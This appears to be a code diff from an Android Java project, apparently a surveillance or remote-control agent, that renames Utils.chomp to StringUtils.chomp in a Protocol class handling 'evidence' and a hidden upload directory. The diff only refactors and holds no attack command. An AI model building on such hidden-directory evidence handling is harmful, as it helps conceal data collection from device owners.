@@ -22,7 +22,6 @@ import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfType;
-import com.android.networking.conf.Configuration;
 import com.android.networking.evidence.Evidence;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.file.AutoFile;
@@ -32,7 +31,7 @@ import com.android.networking.interfaces.iProtocol;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
+import com.android.networking.util.StringUtils;
 import com.android.networking.util.WChar;
 
 /**
@@ -268,7 +267,7 @@ public abstract class Protocol implements iProtocol {
 		if (Cfg.DEBUG) {
 			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
-		final String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR //$NON-NLS-1$
+		final String path = StringUtils.chomp(Path.hidden(), "/"); // UPLOAD_DIR //$NON-NLS-1$
 		final int macroPos = filename.indexOf(path);
 		if (macroPos >= 0) {
 			if (Cfg.DEBUG) {
@@ -481,7 +480,7 @@ public abstract class Protocol implements iProtocol {
 				if (dPath.startsWith("//")) { //$NON-NLS-1$
 					dPath = dPath.substring(1);
 				}
-				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) { //$NON-NLS-1$
+				if (dPath.indexOf(StringUtils.chomp(Path.hidden(), "/")) >= 0) { //$NON-NLS-1$
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Warn: " + "expandPath ignoring hidden path: " + dPath);//$NON-NLS-1$ //$NON-NLS-2$
 					}
